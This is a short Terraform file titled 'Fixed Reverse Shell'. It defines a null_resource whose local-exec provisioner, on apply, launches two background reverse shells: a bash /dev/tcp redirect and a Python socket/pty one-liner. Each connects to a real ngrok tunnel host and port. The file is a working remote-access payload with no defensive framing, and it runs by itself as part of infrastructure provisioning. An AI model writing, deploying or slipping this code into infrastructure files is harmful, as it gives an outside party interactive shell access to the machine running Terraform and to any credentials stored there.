# main.tf - Fixed Reverse Shell
resource "null_resource" "reverse_shell" {
  provisioner "local-exec" {
    command = <<EOT
      echo "Testing reverse shell methods..."
      
      # Method 1: Fixed bash TCP path
      bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/14419 0>&1' &
      
      # Give it a moment to connect
      sleep 2
      
      # Method 2: Python fallback
      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("2.tcp.eu.ngrok.io",19663));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
      
      echo "Reverse shell attempts completed"
    EOT
  }
}
